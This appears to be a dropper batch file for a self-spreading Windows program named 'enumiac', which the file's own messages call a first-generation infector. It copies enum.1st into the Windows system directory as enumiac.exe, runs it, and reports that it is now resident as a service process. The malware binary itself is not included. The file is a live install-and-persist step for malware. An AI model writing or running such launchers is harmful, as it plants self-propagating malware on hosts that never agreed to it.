@echo off
ECHO enumiacs must have a copy of itself in your system directory since
ECHO this is first generation. Infected hosts will create this file.
copy enum.1st %windir%\system\enumiac.exe
%windir%\system\enumiac.exe
ECHO enumiacs in memory as a service process! 
